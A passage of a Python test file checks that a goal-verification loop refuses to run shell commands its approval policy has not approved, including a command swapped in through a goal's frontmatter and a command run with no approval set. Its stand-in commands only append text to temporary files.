    _acceptance(sdlc, "echo y >> %s" % extra)
    policy = _mod("shell_policy")
    monkeypatch.setenv(ENV, policy.approval_value(IDENTITY, command))
    assert _mod("loop").verify_goal(sdlc, "0001") == 2
    assert not ran.exists() and not extra.exists()
    assert "does not approve every command" in capsys.readouterr().err


def test_verify_refuses_a_local_goal_whose_frontmatter_replaces_the_command(tmp_path, monkeypatch, capsys):
    ran, other = tmp_path / "ran.txt", tmp_path / "other.txt"
    command = "echo x >> %s" % ran
    sdlc = _verify_project(tmp_path, command)
    goal = sdlc / "goals" / "0001.md"
    goal.write_text("---\nid: 0001\nstatus: pending\nverify_command: echo y >> %s\n---\n" % other)
    policy = _mod("shell_policy")
    monkeypatch.setenv(ENV, policy.approval_value(IDENTITY, command))
    assert _mod("loop").verify_goal(sdlc, goal) == 2
    assert not ran.exists() and not other.exists()
    assert "does not approve every command" in capsys.readouterr().err


def test_verify_refusal_with_the_variable_unset_is_the_shared_text(tmp_path, capsys):
    sdlc = _verify_project(tmp_path, "echo x >> %s" % (tmp_path / "ran.txt"))
    loop, policy = _mod("loop"), _mod("shell_policy")
    assert loop.verify_goal(sdlc, "0001") == 2
    assert capsys.readouterr().err.splitlines()[-1] == "loop.py verify: " + policy.refusal_message()
